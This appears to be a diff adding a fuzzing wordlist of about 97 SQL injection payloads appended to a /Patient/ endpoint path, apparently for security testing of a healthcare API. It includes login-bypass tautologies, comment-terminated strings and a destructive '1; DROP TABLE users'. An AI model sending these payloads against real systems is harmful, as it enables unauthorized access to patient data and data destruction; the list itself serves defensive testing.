@@ -1,0 +1,98 @@
+sql-injection-endpoint
+/Patient/'-'
+/Patient/' '
+/Patient/'&'
+/Patient/'^'
+/Patient/'*'
+/Patient/' or ''-'
+/Patient/' or '' '
+/Patient/' or ''&'
+/Patient/' or ''^'
+/Patient/' or ''*'
+/Patient/"-"
+/Patient/" "
+/Patient/"&"
+/Patient/"^"
+/Patient/"*"
+/Patient/" or ""-"
+/Patient/" or "" "
+/Patient/" or ""&"
+/Patient/" or ""^"
+/Patient/" or ""*"
+/Patient/or true--
+/Patient/' or 'x'='x
+/Patient/') or ('x')=('x
+/Patient/admin' #
+/Patient/admin'/*
+/Patient/admin' or '1'='1
+/Patient/admin' or '1'='1'--
+/Patient/admin' or '1'='1'#
+/Patient/admin' or '1'='1'/*
+/Patient/admin'or 1=1 or ''='
+/Patient/admin' or 1=1
+/Patient/admin' or 1=1--
+/Patient/admin' or 1=1#
+/Patient/admin' or 1=1/*
+/Patient/admin') or ('1'='1
+/Patient/admin') or ('1'='1'--
+/Patient/admin') or ('1'='1'#
+/Patient/admin') or ('1'='1'/*
+/Patient/admin') or '1'='1
+/Patient/admin') or '1'='1'--
+/Patient/admin') or '1'='1'#
+/Patient/admin') or '1'='1'/*
+/Patient/or 1=1
+/Patient/or 1=1--
+/Patient/ or 1=1/*
+/Patient/or 1=1#
+/Patient/or 1=1–
+/Patient/' or 1=1--
+/Patient/' or '1'='1
+/Patient/' or '1'='1'--
+/Patient/' or '1'='1'/*
+/Patient/' or '1'='1'#
+/Patient/' or '1′='1
+/Patient/' or 1=1
+/Patient/' or 1=1 --
+/Patient/' or 1=1 –
+/Patient/' or 1=1--
+/Patient/' or 1=1;#
+/Patient/' or 1=1/*
+/Patient/' or 1=1#
+/Patient/' or 1=1–
+/Patient/') or '1'='1
+/Patient/') or '1'='1--
+/Patient/') or '1'='1'--
+/Patient/') or '1'='1'/*
+/Patient/') or '1'='1'#
+/Patient/') or ('1'='1
+/Patient/') or ('1'='1--
+/Patient/') or ('1'='1'--
+/Patient/') or ('1'='1'/*
+/Patient/') or ('1'='1'#
+/Patient/'or'1=1
+/Patient/'or'1=1′
+/Patient/" or "1"="1
+/Patient/" or "1"="1"--
+/Patient/" or "1"="1"/*
+/Patient/" or "1"="1"#
+/Patient/" or 1=1
+/Patient/" or 1=1 --
+/Patient/" or 1=1 –
+/Patient/" or 1=1--
+/Patient/" or 1=1/*
+/Patient/" or 1=1#
+/Patient/" or 1=1–
+/Patient/") or "1"="1
+/Patient/") or "1"="1"--
+/Patient/") or "1"="1"/*
+/Patient/") or "1"="1"#
+/Patient/") or ("1"="1
+/Patient/") or ("1"="1"--
+/Patient/") or ("1"="1"/*
+/Patient/") or ("1"="1"#
+/Patient/) or '1′='1–
+/Patient/) or ('1′='1–
+/Patient/' or 1=1 LIMIT 1;#
+/Patient/1; DROP TABLE users
+/Patient/1
